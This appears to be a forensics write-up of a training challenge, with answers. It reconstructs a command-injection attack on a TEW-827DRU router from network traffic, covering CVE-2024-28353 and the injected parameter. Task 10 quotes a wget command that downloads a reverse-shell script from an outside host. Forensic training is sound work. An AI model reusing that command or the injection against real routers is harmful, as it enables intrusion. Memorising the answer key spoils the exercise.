@@ -1,0 +1,117 @@
+# **Trent - DFIR**
+
+Sherlock Scenario :  **The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation. You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker's Techniques, Tactics, and Procedures (TTPs).**
+
+*Since we are monitoring the infected router logs look for the incoming traffic IP address.*
+
+**Task 1**
+
+**From what IP address did the attacker initially launched their activity?**
+
+**Ans: 192.168.10.2**
+
+*Since we are monitoring the infected router logs look for the incoming traffic IP address.*
+
+*Filter traffic in Wireshark for HTTP and review all Post requests as there are multiple interesting URL traffic.*
+
+*Upon review you will find post requests where the attacker is trying to login to the router. If you follow TCP stream of those requests. You will fins the router Model Name.*
+
+![task 2.png](attachment:f3adfc39-de4a-466e-9583-34bc612df6e5:task_2.png)
+
+**Task 2**
+
+**What is the model name of the compromised router?**
+
+**Ans: TEW-827DRU**
+
+*If you review all post requests for login with URI  /apply_sec.cgi?csrf_token= you will find two failed requests (11:52:53 and 11:52:40) and a successful  login at 2024-05-01 11:53:27 (remember this is EST and UTC is : 2024-05-01 15:53:27)*
+
+![task 6.png](attachment:3d0f59b4-6adc-4949-a0d2-be49e978ba75:task_6.png)
+
+Task 3
+
+**How many failed login attempts did the attacker try before successfully logging into the router?**
+
+**Ans: 2**
+
+**Task 4**
+
+**At what UTC time did the attacker successfully log into the routers web admin interface?**
+
+**Ans: 2024-05-01 15:53:27**
+
+Now lets review the Successful Post request. Right click on the packet → Follow → TCP Stream
+
+![task 5.png](attachment:8d0e45b1-94f2-497d-ad55-0f2b293d8821:task_5.png)
+
+Y*ou can see no password was entered for successful login*
+
+**Task 5**
+
+**How many characters long was the password used to log in successfully?**
+
+**Ans: 0**
+
+*Now lets review POST requests after 2024-05-01 11:53:27 and you can find multiple POST requests.*
+
+*Review each one of them by following TCP stream to understand what is happening.*
+
+*As you review you will find every Post request trying to inject values to parameter : “ **usbapps.config.smb_admin_name**”*
+
+*like these requests tries to inject “**Whoami”** and some **URL** with **Wget** indicating attacker was successful at **command injection***
+
+![task b.png](attachment:8a88edf4-16a4-4c65-ace0-ca151521a2ab:task_b.png)
+
+![task a.png](attachment:5a10c569-c2dc-4c8f-b76f-cd88eadb2943:task_a.png)
+
+As we can point out that the attacker is using command injection to connect the router to its C2 server.
+
+**Task 6**
+
+**What is the current firmware version installed on the compromised router?**
+
+**Ans: 2.10**
+
+**Task 7**
+
+**Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?**
+
+**Ans: usbapps.config.smb_admin_name**
+
+*Since we Know its a **TEW-827DRU** router and a remote code execution is performed lets perform some threat intelligence action look for The router with command injection vulnerabilites.*
+
+*You will find this https://nvd.nist.gov/vuln/detail/CVE-2024-28353#match-16536444with CVE and router version number.*
+
+**Task 8**
+
+**What is the CVE number associated with the vulnerability that was exploited in this attack?**
+
+**Ans: CVE-2024-28353**
+
+**Task 9**
+
+**What was the first command the attacker executed by exploiting the vulnerability?**
+
+**Ans: whoami**
+
+**Task 10**
+
+**What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?**
+
+**Ans: wget http://35.159.25.253:8000/a1l4m.sh**
+
+*When you reviewed post requests earlier you can find POST requests where the reverse shell failed*
+
+![task 7-11.png](attachment:f6398db0-8f46-4dac-a55d-33be0d15030a:task_7-11.png)
+
+**Task 11**
+
+**Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?**
+
+**Ans: Access to this resource is forbidden**
+
+**Task 12**
+
+**What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)**
+
+**Ans: 35.159.25.253:41143**
